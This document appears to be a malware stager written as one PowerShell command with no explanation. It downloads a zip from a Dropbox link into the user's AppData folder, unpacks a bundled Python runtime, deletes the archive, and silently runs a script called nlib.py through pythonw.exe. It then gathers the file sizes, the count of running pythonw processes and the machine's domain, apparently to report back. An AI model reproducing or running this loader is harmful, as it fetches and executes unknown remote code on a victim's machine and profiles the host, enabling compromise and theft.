try { iwr "https://www.dropbox.com/scl/fi/d0y4qye83morauohwnybr/rcupxqptmdfjqtv.zip?rlkey=kc4d3d946mgumw2x1qeqvrqed&dl=1" -OutFile "$env:appdata\Wnp.zip" -ErrorAction Stop; Expand-Archive "$env:appdata\Wnp.zip" -DestinationPath "$env:appdata" -ErrorAction Stop; rm "$env:appdata\Wnp.zip" -ErrorAction Stop; cd $env:appdata\WPy64-31401\python -ErrorAction Stop; .\pythonw.exe .\nlib.py -ErrorAction Stop; $comres="true" } catch { $err = $_.Exception.Message; if ($err.Length -gt 500) { $err = $err.Substring(0, 500) }; $comres=$err }; 1; 3; try { $archive=(Get-Item "$env:APPDATA\Wnp.zip" -ErrorAction Stop).Length } catch { $archive=0 }; try { $file=(Get-Item "$env:APPDATA\WPy64-31401\python\nlib.py" -ErrorAction Stop).Length } catch { $file=0 }; "PP"; " "; try { $process=@(Get-Process pythonw -ErrorAction Stop).Count } catch { $process=0 }; try { $systemInfo = systeminfo | findstr /C:"Domain"; $domain = $systemInfo -replace ".Domain:\s" } catch { $domain="UNKNOWN" }; 
